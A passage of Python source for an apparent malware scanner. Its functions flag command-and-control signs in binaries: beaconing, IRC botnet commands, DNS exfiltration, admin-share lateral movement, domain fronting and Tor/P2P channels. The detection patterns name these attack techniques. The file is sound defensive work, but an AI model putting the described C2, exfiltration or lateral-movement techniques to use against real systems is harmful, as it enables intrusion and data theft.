    - Base64-encoded exfiltration in URL query parameters
    - HTTP beaconing: same URL path repeated >=3 times (C2 check-in pattern)
    """
    import re

    findings = []
    text = binary_data.decode('latin-1', errors='replace')

    # --- 1. Custom User-Agent: alphanumeric only, no spaces ---
    # Legitimate UA strings always contain spaces and parens (Mozilla/... (compatible;...))
    # Malware-generated strings like "Wefa7e" or custom identifiers are space-free alphanumeric
    ua_pattern = re.compile(r'User-Agent:\s*([A-Za-z0-9]{4,64})\r?\n', re.IGNORECASE)
    for m in ua_pattern.finditer(text):
        ua_value = m.group(1)
        if re.fullmatch(r'[A-Za-z0-9]+', ua_value):
            findings.append({
                'severity': 'HIGH',
                'title': 'CUSTOM_USER_AGENT',
                'detail': (
                    f'user_agent={ua_value} '
                    f'note=CUSTOM_USER_AGENT_C2_beacon_identifier '
                    f'indicator=alphanumeric_only_no_spaces_no_browser_tokens '
                    f'source=PMA_ch14_network_signatures'
                ),
                'host': 'localhost',
                'port': 0,
            })

    # --- 2. POST to known C2 gate/config endpoints ---
    gate_re = re.compile(
        r'POST\s+((?:/update/|/config/|/gate\.php|/check\.php)[^\s]*)\s+HTTP',
        re.IGNORECASE
    )
    for m in gate_re.finditer(text):
        path = m.group(1)
        findings.append({
            'severity': 'HIGH',
            'title': 'C2_GATE_ENDPOINT',
            'detail': (
                f'method=POST '
                f'path={path} '
                f'note=C2_GATE_ENDPOINT_common_botnet_C2_path '
                f'indicator=POST_to_known_gate_or_config_endpoint '
                f'source=PMA_ch14_botnet_communication_patterns'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- 3. Base64-encoded data in URL query parameters ---
    # >32 chars, >80% base64 charset (standard or URL-safe variant)
    b64_charset = set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=-_')
    url_param_re = re.compile(r'[?&]([A-Za-z0-9_%-]+)=([A-Za-z0-9+/=_%-]{32,})')
    for m in url_param_re.finditer(text):
        param_name = m.group(1)
        param_value = m.group(2)
        if len(param_value) > 32:
            b64_chars = sum(1 for c in param_value if c in b64_charset)
            ratio = b64_chars / len(param_value)
            if ratio > 0.80:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'ENCODED_URL_PARAMS',
                    'detail': (
                        f'param={param_name} '
                        f'value_len={len(param_value)} '
                        f'b64_ratio={ratio:.2f} '
                        f'sample={param_value[:32]}... '
                        f'note=ENCODED_URL_PARAMS_exfiltration_via_URL '
                        f'indicator=query_param_value_>32_chars_>80pct_base64_charset '
                        f'source=PMA_lab14-1_base64_beacon_encoding'
                    ),
                    'host': 'localhost',
                    'port': 0,
                })

    # --- 4. HTTP beaconing: same URL path repeated >=3 times ---
    # C2 clients loop with Sleep() then re-request the same URI for commands
    # (PMA: WinMain loop -> Sleep -> InternetOpenUrlA to same path repeatedly)
    path_re = re.compile(r'(?:GET|POST)\s+(/[^\s?#]*)', re.IGNORECASE)
    path_counts = {}
    for m in path_re.finditer(text):
        p = m.group(1)
        path_counts[p] = path_counts.get(p, 0) + 1

    for path, count in path_counts.items():
        if count >= 3:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'BEACONING_PATTERN',
                'detail': (
                    f'path={path} '
                    f'request_count={count} '
                    f'note=BEACONING_PATTERN_C2_check-in_behavior '
                    f'indicator=same_URL_path_repeated_{count}_times '
                    f'source=PMA_ch15_client_initiated_beaconing'
                ),
                'host': 'localhost',
                'port': 0,
            })

    return findings


def detect_irc_c2_indicators(binary_data: bytes) -> list:
    """
    Detect IRC-based C2 communication patterns in binary data.

    Indicators drawn from PMA Ch. 15 (IRC botnet history and detection),
    Ch. 11 (backdoors/botnets), and lab solutions:
    - NICK + JOIN sequence = IRC botnet registration flow
    - irc. or .irc in embedded domain strings = IRC server reference
    - PRIVMSG containing DOWNLOAD or EXEC = remote command execution via IRC
    - Bot-associated channel names (#bots, #infected, #pwned, etc.)
    """
    import re

    findings = []
    text = binary_data.decode('latin-1', errors='replace')

    # --- 1. IRC NICK followed by JOIN: botnet registration sequence ---
    # Classic IRC botnet: bot connects, issues NICK <botname>, then JOINs a channel
    # to receive commands from the botnet controller
    nick_join_re = re.compile(
        r'NICK\s+[^\r\n]+[\r\n].*?JOIN\s+#[^\r\n]+',
        re.IGNORECASE | re.DOTALL
    )
    m = nick_join_re.search(text)
    if m:
        snippet = m.group(0)[:120].replace('\r', '').replace('\n', ' ')
        findings.append({
            'severity': 'CRITICAL',
            'title': 'IRC_C2_INDICATOR',
            'detail': (
                f'sequence=NICK_then_JOIN '
                f'snippet={repr(snippet[:80])} '
                f'note=IRC_C2_INDICATOR_IRC-based_botnet '
                f'indicator=NICK_command_followed_by_JOIN_channel_registration '
                f'source=PMA_ch11_botnets_ch15_irc_c2_history'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- 2. IRC server domain references ---
    irc_domain_re = re.compile(r'(?:irc\.[a-z0-9.-]{3,}|[a-z0-9-]{3,}\.irc\b)', re.IGNORECASE)
    for m in irc_domain_re.finditer(text):
        domain = m.group(0)
        findings.append({
            'severity': 'HIGH',
            'title': 'IRC_SERVER_REFERENCE',
            'detail': (
                f'domain={domain} '
                f'note=IRC_SERVER_REFERENCE_embedded_IRC_server_domain '
                f'indicator=irc_subdomain_or_irc_TLD_reference '
                f'source=PMA_ch15_attackers_mimic_existing_protocols'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- 3. PRIVMSG carrying DOWNLOAD or EXEC commands ---
    # IRC botnets receive operator commands via PRIVMSG to the bot or channel;
    # DOWNLOAD = fetch and execute a remote payload, EXEC = run a shell command
    privmsg_cmd_re = re.compile(
        r'PRIVMSG\s+[^\r\n]*(?:DOWNLOAD|EXEC|\.download|\.exec|!download|!exec)[^\r\n]*',
        re.IGNORECASE
    )
    for m in privmsg_cmd_re.finditer(text):
        snippet = m.group(0)[:120]
        findings.append({
            'severity': 'CRITICAL',
            'title': 'IRC_REMOTE_EXEC',
            'detail': (
                f'command_snippet={repr(snippet[:80])} '
                f'note=IRC_REMOTE_EXEC_command_execution_via_IRC '
                f'indicator=PRIVMSG_containing_DOWNLOAD_or_EXEC_directive '
                f'source=PMA_ch11_botnet_controller_commands'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- 4. Bot-associated IRC channel names ---
    # Botnet operators use predictable channel names; presence in binary = hardcoded C2 channel
    botnet_channel_re = re.compile(
        r'#(bots?|infected|pwned|zombies?|slaves?|army|ddos|spam|rootkit|malware)\b',
        re.IGNORECASE
    )
    for m in botnet_channel_re.finditer(text):
        channel = '#' + m.group(1)
        findings.append({
            'severity': 'HIGH',
            'title': 'IRC_BOTNET_CHANNEL',
            'detail': (
                f'channel={channel} '
                f'note=IRC_BOTNET_CHANNEL_bot_congregation_channel '
                f'indicator=channel_name_matches_known_botnet_naming_pattern '
                f'source=PMA_ch11_botnet_zombie_coordination'
            ),
            'host': 'localhost',
            'port': 0,
        })

    return findings


def detect_dns_c2_indicators(binary_data: bytes) -> list:
    """
    Detect DNS-based C2 and exfiltration patterns in binary data.

    Sources:
      - PMA ch7 (networking APIs, gethostbyname DNS lookups as C2 IOC,
        WinINet high-level protocols) — Sikorski & Honig
      - PMA Appendix A (gethostbyname, InternetOpen, InternetOpenUrl patterns)
      - PMA ch3 (packet sniffing, DNS traffic observation, INetSim DNS simulation)
      - Violent Python ch5 (DNS packet layer parsing with Scapy, regex on payload)

    DGA reference: malware generates domain names algorithmically to resist
    sinkholing; the resulting strings cluster in high-consonant, random-looking
    labels. DNS TXT records carry arbitrary blobs, making them a popular
    exfiltration channel. Subdomain labels encode data in base64 or as
    high-entropy hex strings that ride normal DNS resolvers.
    """
    findings = []
    try:
        text = binary_data.decode('latin-1', errors='replace')
    except Exception:
        text = ''

    # --- 1. DGA: random-looking domain strings (high consonant ratio, long label) ---
    # DGA domains are generated algorithmically; they look like gibberish.
    # PMA ch7: gethostbyname is how malware resolves C2 hostnames at runtime;
    # when the hostname is algorithmically generated the call sequence repeats
    # rapidly. Indicator: label >12 chars, consonant-to-vowel ratio >3:1.
    vowels = set('aeiouAEIOU')
    # Extract candidate domain-like tokens: alphanumeric runs with dots that
    # look like hostnames (contain at least one dot, reasonable TLD suffix).
    domain_token_re = re.compile(
        r'\b([a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)\.(?:com|net|org|info|biz|io|cc|tk|xyz|top|pw|ru|cn)\b'
    )
    seen_dga = set()
    for m in domain_token_re.finditer(text):
        label = m.group(1)
        if len(label) < 12:
            continue
        consonant_count = sum(1 for c in label.lower() if c.isalpha() and c not in vowels)
        vowel_count = sum(1 for c in label.lower() if c in vowels)
        if vowel_count == 0:
            ratio = float('inf')
        else:
            ratio = consonant_count / vowel_count
        if ratio >= 3.0 and label not in seen_dga:
            seen_dga.add(label)
            findings.append({
                'severity': 'HIGH',
                'title': 'POSSIBLE_DGA_DOMAINS',
                'detail': (
                    f'label={label} '
                    f'consonant_ratio={ratio:.1f} '
                    f'label_len={len(label)} '
                    f'note=POSSIBLE_DGA_DOMAINS_algorithmic_domain_generation '
                    f'indicator=high_consonant_ratio_long_subdomain_label '
                    f'source=PMA_ch7_gethostbyname_C2_resolution_appendixA_networking'
                ),
                'host': 'localhost',
                'port': 0,
            })

    # --- 2. DNS TXT record queries carrying long payloads (data exfiltration) ---
    # TXT records can carry arbitrary binary-safe strings; malware uses them to
    # pull down config or exfiltrate data by encoding it as TXT query answers.
    # Violent Python ch5: DNS packet parsing shows TXT layer carries raw load;
    # PMA ch3 INetSim fakes DNS to capture these queries in analysis sandboxes.
    # Heuristic: any string sequence >100 consecutive printable chars embedded
    # between DNS-like context (query patterns) signals TXT data exfil.
    txt_payload_re = re.compile(
        r'(?i)(?:dns|txt|nslookup|DnsQuery|DnsQueryEx|resolver)[\s\S]{0,60}([\x20-\x7e]{100,})'
    )
    for m in txt_payload_re.finditer(text):
        payload_snippet = m.group(1)[:120]
        findings.append({
            'severity': 'CRITICAL',
            'title': 'DNS_TXT_DATA_EXFIL',
            'detail': (
                f'payload_snippet={repr(payload_snippet[:80])} '
                f'payload_len_lower_bound={len(m.group(1))} '
                f'note=DNS_TXT_DATA_EXFIL_data_exfiltration_via_DNS_TXT_record '
                f'indicator=DNS_API_call_adjacent_to_long_printable_payload_string '
                f'source=PMA_ch3_INetSim_DNS_capture_violent_python_ch5_dns_packet_layer'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- 3. Subdomain encoding: base64-decodeable subdomain labels ---
    # Covert channels encode data as subdomain labels: e.g. "aGVsbG8=" as the
    # first label of a lookup, riding normal recursive resolvers to reach the
    # operator's authoritative nameserver.
    # PMA Appendix A: gethostbyname is the call that fires; the hostname argument
    # is the encoded label concatenated with the C2 domain.
    b64_label_re = re.compile(
        r'\b([A-Za-z0-9+/]{16,}={0,2})\.'  # base64-looking label before a dot
        r'(?:[a-zA-Z0-9\-]+\.){1,3}[a-zA-Z]{2,6}\b'
    )
    seen_b64 = set()
    for m in b64_label_re.finditer(text):
        label = m.group(1)
        if label in seen_b64:
            continue
        # Attempt decode; only flag if decoded bytes look like data (not all-null)
        try:
            # Pad to multiple of 4
            padded = label + '=' * ((-len(label)) % 4)
            decoded = base64.b64decode(padded)
            if len(decoded) >= 8 and any(b != 0 for b in decoded):
                seen_b64.add(label)
                findings.append({
                    'severity': 'HIGH',
                    'title': 'DNS_SUBDOMAIN_ENCODING',
                    'detail': (
                        f'encoded_label={label[:40]} '
                        f'decoded_preview={repr(decoded[:20])} '
                        f'note=DNS_SUBDOMAIN_ENCODING_covert_channel_via_DNS_subdomain '
                        f'indicator=base64_decodeable_subdomain_label_in_DNS_hostname '
                        f'source=PMA_appendixA_gethostbyname_C2_hostname_argument'
                    ),
                    'host': 'localhost',
                    'port': 0,
                })
        except Exception:
            pass

    # --- 4. High-entropy subdomain labels (DNS C2 beacon) ---
    # Some C2 frameworks hex-encode or use pseudo-random labels rather than
    # base64; Shannon entropy distinguishes these from legitimate hostnames.
    # PMA ch7: WinINet InternetOpen / InternetOpenUrl are high-level DNS-backed
    # calls; low-level gethostbyname is used when the label is generated in code.
    # A label >20 chars with entropy >4.0 bits/char strongly suggests encoding.
    high_entropy_label_re = re.compile(
        r'\b([a-zA-Z0-9]{20,})\.'
        r'(?:[a-zA-Z0-9\-]+\.){0,3}[a-zA-Z]{2,6}\b'
    )
    seen_entropy = set()
    for m in high_entropy_label_re.finditer(text):
        label = m.group(1)
        if label in seen_entropy or label in seen_b64:
            continue
        # Shannon entropy: H = -sum(p * log2(p))
        freq_map: dict = {}
        for ch in label:
            freq_map[ch] = freq_map.get(ch, 0) + 1
        n = len(label)
        entropy = -sum((count / n) * math.log2(count / n) for count in freq_map.values() if count > 0)
        if entropy > 4.0:
            seen_entropy.add(label)
            findings.append({
                'severity': 'HIGH',
                'title': 'HIGH_ENTROPY_SUBDOMAIN',
                'detail': (
                    f'label={label[:40]} '
                    f'entropy={entropy:.2f} '
                    f'label_len={len(label)} '
                    f'note=HIGH_ENTROPY_SUBDOMAIN_DNS_C2_beacon '
                    f'indicator=subdomain_label_gt20_chars_shannon_entropy_gt4.0 '
                    f'source=PMA_ch7_WinINet_InternetOpen_DNS_backed_C2_call'
                ),
                'host': 'localhost',
                'port': 0,
            })

    return findings


def detect_lateral_movement_protocols(binary_data: bytes) -> list:
    """
    Detect Windows lateral movement API patterns in binary data.

    Sources:
      - PMA Appendix A (NetShareEnum, WNetAddConnection, CreateRemoteThread,
        OpenProcess, WriteProcessMemory — mapped to lateral movement techniques)
      - PMA ch7 (Windows API networking — WinINet, Winsock; LDAP via WinINet;
        UNC path usage with CreateFile for remote shares)
      - PMA ch11 (malware behavior: downloaders connect to shares, credential
        stealers enumerate domain groups, backdoors use admin shares for staging)
      - Violent Python ch5 (network share enumeration analogues in Python;
        regex-based payload inspection for protocol-specific strings)

    Windows lateral movement primitives cluster around four surfaces:
      1. Network share enumeration and connection (WNet*, Net*)
      2. Admin share access for payload staging (ADMIN$, C$, IPC$)
      3. Remote file operations via UNC paths (\\\\host\\share\\path)
      4. Active Directory reconnaissance (LDAP queries, group membership)
    """
    findings = []
    try:
        text = binary_data.decode('latin-1', errors='replace')
    except Exception:
        text = ''

    # --- 1. Windows Network Share Enumeration (WNet API) ---
    # WNetAddConnection establishes a connection to a network share;
    # WNetOpenEnum begins enumeration of network resources.
    # PMA Appendix A: NetShareEnum enumerates network shares; presence in
    # the import table is a direct lateral movement indicator.
    # PMA ch11: malware uses these to locate target shares before staging payloads.
    wnet_enum_re = re.compile(r'WNet(?:AddConnection\w*|OpenEnum)\b')
    seen_wnet = set()
    for m in wnet_enum_re.finditer(text):
        fn = m.group(0)
        if fn in seen_wnet:
            continue
        seen_wnet.add(fn)
        findings.append({
            'severity': 'HIGH',
            'title': 'WINDOWS_NET_SHARE_ENUM',
            'detail': (
                f'api={fn} '
                f'note=WINDOWS_NET_SHARE_ENUM_network_share_enumeration '
                f'indicator=WNetAddConnection_or_WNetOpenEnum_present_in_binary '
                f'source=PMA_appendixA_NetShareEnum_ch11_malware_share_staging'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- 2. Admin Share Access (lateral movement staging path) ---
    # ADMIN$, C$, and IPC$ are Windows hidden administrative shares.
    # Malware uses them to copy executables or drop loaders on remote hosts.
    # PMA ch11: backdoors and downloaders stage payloads via admin shares;
    # IPC$ is used for null-session authentication and pipe access.
    admin_share_re = re.compile(r'\\\\[^\\]*\\(?:ADMIN\$|C\$|IPC\$|D\$|E\$)', re.IGNORECASE)
    seen_shares = set()
    for m in admin_share_re.finditer(text):
        share = m.group(0)
        if share in seen_shares:
            continue
        seen_shares.add(share)
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ADMIN_SHARE_ACCESS',
            'detail': (
                f'share_path={repr(share)} '
                f'note=ADMIN_SHARE_ACCESS_lateral_movement_via_admin_shares '
                f'indicator=hardcoded_UNC_path_targeting_hidden_admin_share '
                f'source=PMA_ch11_backdoor_payload_staging_admin_shares'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- 3. Remote File Operation via UNC Path ---
    # GetSystemInfo gathers OS/CPU details for target profiling;
    # CreateFile on a UNC path writes files directly to a remote host's filesystem.
    # PMA Appendix A: CreateFile creates/opens files; combined with a UNC path
    # argument this is a remote write. OpenProcess + WriteProcessMemory is the
    # injection chain — the UNC variant stages the initial dropper.
    # PMA ch7: WinINet functions back-fill where WNet is absent; raw Winsock +
    # UNC path construction achieves the same cross-host write.
    has_sysinfo = bool(re.search(r'GetSystemInfo\b', text))
    unc_path_re = re.compile(r'\\\\\\\\.{1,64}\\[a-zA-Z0-9_$\-]{1,30}\\')
    if has_sysinfo:
        seen_unc = set()
        for m in unc_path_re.finditer(text):
            unc = m.group(0)
            if unc in seen_unc:
                continue
            seen_unc.add(unc)
            findings.append({
                'severity': 'HIGH',
                'title': 'REMOTE_FILE_OPERATION',
                'detail': (
                    f'unc_path={repr(unc)} '
                    f'note=REMOTE_FILE_OPERATION_cross_host_file_write '
                    f'indicator=GetSystemInfo_plus_CreateFile_with_UNC_path '
                    f'source=PMA_appendixA_CreateFile_OpenProcess_ch7_winsock_unc'
                ),
                'host': 'localhost',
                'port': 0,
            })

    # --- 4. Active Directory Group/Member Enumeration ---
    # NetLocalGroupGetMembers and NetGroupGetUsers enumerate group membership
    # from domain controllers or local SAM; used to identify privileged accounts
    # before targeted credential theft or lateral move to high-value hosts.
    # PMA Appendix A: LsaEnumerateLogonSessions / SamIConnect chain for credential
    # stealers; Net* group APIs are the reconnaissance layer preceding that chain.
    # Violent Python ch5: regex-based extraction of target strings from network
    # payloads — same pattern applied here to binary strings.
    ad_group_re = re.compile(r'Net(?:LocalGroupGetMembers|GroupGetUsers|LocalGroupEnum)\b')
    seen_ad = set()
    for m in ad_group_re.finditer(text):
        fn = m.group(0)
        if fn in seen_ad:
            continue
        seen_ad.add(fn)
        findings.append({
            'severity': 'HIGH',
            'title': 'AD_GROUP_ENUM',
            'detail': (
                f'api={fn} '
                f'note=AD_GROUP_ENUM_Active_Directory_member_enumeration '
                f'indicator=NetLocalGroupGetMembers_or_NetGroupGetUsers_in_binary '
                f'source=PMA_appendixA_LsaEnumerateLogonSessions_ch11_credential_stealer_recon'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- 5. LDAP Query Strings (AD Reconnaissance) ---
    # LDAP:// or ldap:// URIs indicate Active Directory queries — malware uses
    # these to enumerate OUs, users, groups, and GPOs without touching Net* APIs.
    # PMA ch11: credential stealers and backdoors perform AD reconnaissance to
    # map the domain before moving laterally to domain controllers.
    ldap_re = re.compile(r'(?i)ldap://[^\s\x00"\'<>]{4,}')
    seen_ldap = set()
    for m in ldap_re.finditer(text):
        uri = m.group(0)[:80]
        key = uri[:40]
        if key in seen_ldap:
            continue
        seen_ldap.add(key)
        findings.append({
            'severity': 'MEDIUM',
            'title': 'LDAP_QUERY',
            'detail': (
                f'uri={repr(uri)} '
                f'note=LDAP_QUERY_LDAP_AD_reconnaissance '
                f'indicator=LDAP_URI_scheme_present_in_binary '
                f'source=PMA_ch11_backdoor_AD_domain_enumeration'
            ),
            'host': 'localhost',
            'port': 0,
        })

    return findings


def detect_domain_fronting_indicators(binary_data: bytes) -> list:
    """
    Detect domain fronting indicators in binary data.

    Indicators drawn from PMA Ch. 14 (malware-focused network signatures, attacker
    infrastructure abuse) and Ch. 15 (hiding in plain sight, HTTPS-based C2 evasion):
    - CDN domain strings co-present with non-matching Host headers (CDN as SNI/proxy,
      Host header routes to real C2 backend — the operational domain fronting pattern)
    - Hardcoded Host header value differs from connection target extracted from binary
      (CONNECT tunnel target or URL hostname differs from Host: field)
    - TLS SNI API calls alongside CDN target + different Host header (active config)

    Domain fronting exploits CDN "any-cast" routing: TLS SNI selects the CDN PoP,
    Host header routes to an attacker-controlled origin behind the CDN. The CDN's
    IP appears in network logs, not the C2 server's.
    """
    import re

    findings = []
    text = binary_data.decode('latin-1', errors='replace')

    CDN_DOMAINS = ['cloudfront.net', 'azureedge.net', 'fastly.net', 'cloudflare.com']

    # --- 1. CDN domain string near non-matching Host header ---
    # Domain fronting: binary contains CDN hostname (used as connection/SNI target)
    # AND a Host: header value that is a different domain (the actual C2 backend).
    # PMA ch14/ch15: attackers leverage existing CDN infrastructure to blend C2 traffic
    # into legitimate CDN request streams; the CDN forwards by Host header.
    cdn_present = [cdn for cdn in CDN_DOMAINS if cdn.lower() in text.lower()]
    host_re = re.compile(r'Host:\s*([^\r\n\x00]{4,128})', re.IGNORECASE)
    host_vals = [m.group(1).strip() for m in host_re.finditer(text)]

    for cdn in cdn_present:
        non_cdn_hosts = [h for h in host_vals if cdn.lower() not in h.lower()]
        if non_cdn_hosts:
            findings.append({
                'severity': 'HIGH',
                'title': 'DOMAIN_FRONTING_CDN',
                'detail': (
                    f'cdn_string={cdn} '
                    f'host_header={non_cdn_hosts[0][:64]} '
                    f'note=DOMAIN_FRONTING_CDN_CDN_domain_used_for_C2_traffic_routing '
                    f'indicator=CDN_domain_in_binary_with_non-matching_Host_header '
                    f'source=PMA_ch14_ch15_attacker_uses_existing_CDN_infrastructure'
                ),
                'host': 'localhost',
                'port': 0,
            })

    # --- 2. Host header hardcoded differently from connection target ---
    # Collect connection target hostnames from CONNECT tunnel requests and embedded URLs;
    # flag when the Host: header set and connection-target set are disjoint.
    # PMA ch14: every static element of malware network traffic is a signature candidate;
    # a mismatched Host vs. connect target is the fingerprint of domain fronting.
    connect_re = re.compile(r'CONNECT\s+([a-zA-Z0-9._-]{4,128}):\d+\s+HTTP', re.IGNORECASE)
    connect_targets = {m.group(1).strip().lower() for m in connect_re.finditer(text)}

    url_host_re = re.compile(r'https?://([a-zA-Z0-9._-]{4,128})', re.IGNORECASE)
    url_hosts = {m.group(1).strip().lower() for m in url_host_re.finditer(text)}

    all_conn_targets = connect_targets | url_hosts
    host_set = {h.lower().split(':')[0] for h in host_vals}

    if host_set and all_conn_targets and not host_set.intersection(all_conn_targets):
        mismatch_host = next(iter(host_set))
        mismatch_target = next(iter(all_conn_targets))
        findings.append({
            'severity': 'HIGH',
            'title': 'HOST_HEADER_MISMATCH',
            'detail': (
                f'host_header={mismatch_host} '
                f'connection_target={mismatch_target} '
                f'note=HOST_HEADER_MISMATCH_domain_fronting_pattern '
                f'indicator=Host_header_does_not_match_URL_or_CONNECT_target_hostname '
                f'source=PMA_ch14_ch15_blending_malicious_traffic_into_legitimate_protocols'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- 3. SNI value differs from Host header in same request construction ---
    # TLS SNI API calls (SSL_set_tlsext_host_name) set the SNI field in ClientHello,
    # selecting the CDN PoP; the subsequent HTTP Host header routes to the C2 backend.
    # When both an SNI configuration API and CDN string are present with a non-matching
    # Host header, the binary is actively configured for domain fronting.
    # PMA ch14/ch15: HTTPS increasingly used to hide C2; SNI/Host mismatch is the
    # operational marker of CDN-based domain fronting.
    sni_indicators = [
        'SSL_set_tlsext_host_name', 'ssl_set_tlsext_host_name',
        'SSL_CTX_set_tlsext_servername_callback',
        'TLSv1_client_method', 'SSL_new', 'SSL_CTX_new',
    ]
    sni_api_found = any(ind in text for ind in sni_indicators)

    if sni_api_found and cdn_present and host_vals:
        non_cdn_hosts = [h for h in host_vals
                         if not any(cdn.lower() in h.lower() for cdn in cdn_present)]
        if non_cdn_hosts:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'SNI_HOST_MISMATCH',
                'detail': (
                    f'sni_api=SSL_set_tlsext_host_name '
                    f'cdn_sni_target={cdn_present[0]} '
                    f'host_header={non_cdn_hosts[0][:64]} '
                    f'note=SNI_HOST_MISMATCH_active_domain_fronting_configuration '
                    f'indicator=TLS_SNI_API_with_CDN_target_and_differing_Host_header '
                    f'source=PMA_ch14_ch15_HTTPS_C2_evasion_via_CDN_SNI_routing'
                ),
                'host': 'localhost',
                'port': 0,
            })

    return findings


def detect_p2p_c2_indicators(binary_data: bytes) -> list:
    """
    Detect peer-to-peer and anonymous-network C2 indicators in binary data.

    Indicators drawn from PMA Ch. 11 (backdoor resilience, decentralized botnets),
    Ch. 14 (network countermeasures, evading sinkholing), and Ch. 15 (attacker
    infrastructure strategies, anonymization):
    - BitTorrent DHT protocol strings (Kademlia-based decentralized C2 bootstrap)
    - Tor hidden service (.onion) addresses (C2 server anonymization)
    - Tor SOCKS proxy endpoints (127.0.0.1:9050/9150 — traffic anonymization)
    - Hardcoded IP list >5 entries (P2P botnet seed node list for bootstrap)

    Decentralized C2 avoids single-domain takedown: no sinkhole target, no registrar
    seizure vector. P2P botnets require every node in the seed list be neutralized.
    """
    import re

    findings = []
    text = binary_data.decode('latin-1', errors='replace')

    # --- 1. BitTorrent DHT protocol indicators ---
    # Kademlia DHT bencoded query prefix "d1:ad2:id20:" identifies DHT messages;
    # "find_node" and "get_peers" are DHT RPC method names used to locate peers.
    # P2P botnets bootstrap via DHT: no central C2 server, resistant to sinkholing.
    # PMA ch11/ch14: decentralized botnet architectures eliminate single-point C2
    # takedown and make defender sinkholing efforts ineffective.
    dht_strings = [b'd1:ad2:id20', b'find_node', b'get_peers']
    dht_found = [s.decode('latin-1') for s in dht_strings if s in binary_data]
    if dht_found:
        findings.append({
            'severity': 'HIGH',
            'title': 'BITTORRENT_DHT',
            'detail': (
                f'dht_strings={dht_found} '
                f'note=BITTORRENT_DHT_P2P_DHT_protocol_Kademlia '
                f'indicator=DHT_bencoded_prefix_or_RPC_method_names_in_binary '
                f'source=PMA_ch11_ch14_decentralized_P2P_C2_botnet_resilience'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- 2. Tor onion address indicators ---
    # .onion hostnames are Tor hidden services: the server IP is never exposed,
    # providing near-perfect C2 operator anonymization. v2 onion = 16 base32 chars,
    # v3 onion = 56 base32 chars. Either embedded in binary strings = Tor C2.
    # PMA ch14/ch15: anonymization services used by attackers to hide infrastructure;
    # .onion C2 survives takedowns of exit-node-reachable clearnet C2 servers.
    onion_re = re.compile(r'\b([a-z2-7]{16,56}\.onion)\b', re.IGNORECASE)
    onion_matches = list(dict.fromkeys(onion_re.findall(text)))  # dedup, preserve order
    for addr in onion_matches[:3]:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'TOR_ONION_ADDRESS',
            'detail': (
                f'onion_address={addr} '
                f'note=TOR_ONION_ADDRESS_Tor_hidden_service_C2 '
                f'indicator=onion_domain_string_embedded_in_binary '
                f'source=PMA_ch14_ch15_anonymous_network_C2_infrastructure'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- 3. Tor SOCKS proxy indicators ---
    # Tor client (tor daemon) listens on 127.0.0.1:9050 by default; Tor Browser
    # bundle uses 9150. Malware connecting via these SOCKS5 endpoints routes all
    # traffic through the Tor anonymization network, hiding C2 server location
    # and exfiltration destination from network monitoring.
    # PMA ch14: attackers use proxy and VPN infrastructure to obscure C2 endpoints.
    tor_socks_addrs = ['127.0.0.1:9050', '127.0.0.1:9150',
                       'localhost:9050', 'localhost:9150']
    seen_ports: set = set()
    for socks_addr in tor_socks_addrs:
        port = socks_addr.split(':')[1]
        if socks_addr in text and port not in seen_ports:
            seen_ports.add(port)
            findings.append({
                'severity': 'CRITICAL',
                'title': 'TOR_SOCKS_PROXY',
                'detail': (
                    f'socks_endpoint={socks_addr} '
                    f'note=TOR_SOCKS_PROXY_Tor_proxy_connection '
                    f'indicator=hardcoded_Tor_SOCKS_proxy_loopback_address_in_binary '
                    f'source=PMA_ch14_ch15_traffic_anonymization_via_SOCKS_proxy'
                ),
                'host': 'localhost',
                'port': 0,
            })

    # --- 4. Hardcoded peer list (P2P botnet seed nodes) ---
    # P2P botnets embed a hardcoded seed peer list to bootstrap DHT/overlay network.
    # >5 distinct routable IPv4 addresses in binary = seed list heuristic.
    # PMA ch11: backdoor resilience through multiple C2 channels; seed node lists
    # ensure the botnet can reconstitute even if some nodes are taken offline.
    ip_re = re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
    seen_ips: list = []
    seen_ip_set: set = set()
    for m in ip_re.finditer(text):
        ip = m.group(1)
        if ip in seen_ip_set:
            continue
        parts = ip.split('.')
        try:
            octets = [int(p) for p in parts]
        except ValueError:
            continue
        if not all(0 <= o <= 255 for o in octets):
            continue
        # Exclude loopback, link-local, and unspecified (already flagged or useless as peers)
        if octets[0] == 127 or octets[0] == 0 or (octets[0] == 169 and octets[1] == 254):
            continue
        seen_ip_set.add(ip)
        seen_ips.append(ip)

    if len(seen_ips) > 5:
        findings.append({
            'severity': 'HIGH',
            'title': 'HARDCODED_PEER_LIST',
            'detail': (
                f'peer_count={len(seen_ips)} '
                f'sample_peers={seen_ips[:5]} '
                f'note=HARDCODED_PEER_LIST_P2P_botnet_seed_nodes '
                f'indicator=more_than_5_routable_IPv4_addresses_hardcoded_in_binary '
                f'source=PMA_ch11_ch14_P2P_botnet_bootstrap_seed_list'
            ),
            'host': 'localhost',
            'port': 0,
        })

    return findings


def detect_icmp_covert_channel(binary_data: bytes) -> list:
    """Detect ICMP-based covert channel patterns in binary data."""
    import re
    findings = []

    # ICMPSendEcho2 or IcmpSendEcho with oversized payload indicator
    icmp_echo_apis = [b'ICMPSendEcho2', b'IcmpSendEcho']
    for api in icmp_echo_apis:
        if api in binary_data:
            # Look for large payload size constants near the API reference
            api_idx = binary_data.find(api)
            context = binary_data[max(0, api_idx - 256):api_idx + 256]
            # Check for payload size > 32 bytes (0x20) as DWORD or encoded literal
            # Heuristic: presence of the API plus any size literal > 32
            size_re = re.compile(rb'[\x21-\xff][\x00]{3}|[\x00][\x21-\xff][\x00]{2}')
            if size_re.search(context):
                findings.append({
                    'severity': 'HIGH',
